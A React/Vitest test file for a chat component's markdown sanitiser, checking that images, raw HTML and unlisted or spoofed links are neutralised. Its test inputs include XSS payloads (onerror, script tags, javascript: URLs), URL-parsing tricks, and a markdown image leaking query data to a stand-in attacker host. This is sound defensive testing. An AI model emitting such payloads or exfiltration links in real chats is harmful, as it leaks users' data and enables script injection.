import { describe, it, expect } from 'vitest'
import { render, screen } from '@testing-library/react'
import { SafeMarkdown, collectUrls, isAllowedLink } from '../../../src/components/chat/SafeMarkdown'

describe('SafeMarkdown', () => {
  it('strips images to their alt text and never renders an <img>', () => {
    const { container } = render(<SafeMarkdown text={'Look ![secret](https://evil.example/?q=sizes) here'} />)
    expect(container.querySelector('img')).toBeNull()
    expect(container).toHaveTextContent('Look secret here')
    expect(container.innerHTML).not.toContain('evil.example')
  })

  it('strips raw HTML tags instead of rendering them', () => {
    const { container } = render(<SafeMarkdown text={'Hi <img src=x onerror=alert(1)><script>alert(2)</script><b>bold</b>'} />)
    expect(container.querySelector('img, script, b')).toBeNull()
    expect(container).toHaveTextContent('Hi alert(2)bold')
  })

  it('only allowlisted links are clickable', () => {
    const allowed = new Set(['https://shop.example/p/1'])
    render(<SafeMarkdown allowedUrls={allowed} text={'[Buy](https://shop.example/p/1) · [Phish](https://evil.example) · [Outfits](/outfits)'} />)
    expect(screen.getByRole('link', { name: 'Buy' })).toHaveAttribute('href', 'https://shop.example/p/1')
    expect(screen.getByRole('link', { name: 'Buy' })).toHaveAttribute('rel', expect.stringContaining('noopener'))
    expect(screen.getByRole('link', { name: 'Outfits' })).toHaveAttribute('href', '/outfits')
    expect(screen.queryByRole('link', { name: 'Phish' })).toBeNull()
    expect(screen.getByText(/Phish/)).toBeInTheDocument()
  })

  it('rejects protocol-relative, javascript: and plain-http links even if listed', () => {
    const allowed = new Set(['javascript:alert(1)', 'http://shop.example'])
    expect(isAllowedLink('//evil.example', allowed)).toBe(false)
    expect(isAllowedLink('javascript:alert(1)', allowed)).toBe(false)
    expect(isAllowedLink('http://shop.example', allowed)).toBe(false)
  })

  it('rejects backslash and whitespace tricks that browsers turn into another host', () => {
    // Browsers normalise "\" to "/", so "/\evil.example" is protocol-relative.
    for (const url of ['/\\evil.example/?q=sizes', '/\\/evil.example', '/%09/evil.example'.replace('%09', '\t'), '/ /evil.example']) {
      expect(isAllowedLink(url)).toBe(false)
    }
    render(<SafeMarkdown text={'[Tap](/\\evil.example/?q=M)'} />)
    expect(screen.queryByRole('link', { name: 'Tap' })).toBeNull()
  })

  it('still allows the app\'s own paths', () => {
    for (const url of ['/', '/outfits', '/closet?item=abc', '/settings/sizes#top']) {
      expect(isAllowedLink(url)).toBe(true)
    }
  })

  it('renders bold, code and lists', () => {
    const { container } = render(<SafeMarkdown text={'**Top pick** uses `navy`\n\n- chinos\n- loafers'} />)
    expect(container.querySelector('strong')).toHaveTextContent('Top pick')
    expect(container.querySelector('code')).toHaveTextContent('navy')
    expect(container.querySelectorAll('li')).toHaveLength(2)
  })

  it('renders a numbered list directly under an intro line', () => {
    const { container } = render(<SafeMarkdown text={'I suggest these for Toronto:\n1. Summer Casual\n2. Fun casual\n\nIt is 17°C.'} />)
    expect(container.querySelector('ol')!.querySelectorAll('li')).toHaveLength(2)
    expect(container.querySelectorAll('p')[0]).toHaveTextContent('I suggest these for Toronto:')
    expect(container).toHaveTextContent('It is 17°C.')
  })

  it('collectUrls gathers https URLs from nested tool results', () => {
    expect([...collectUrls({ a: [{ url: 'https://x.example/1' }, 'http://no.example'], b: 'text' })]).toEqual(['https://x.example/1'])
  })
})
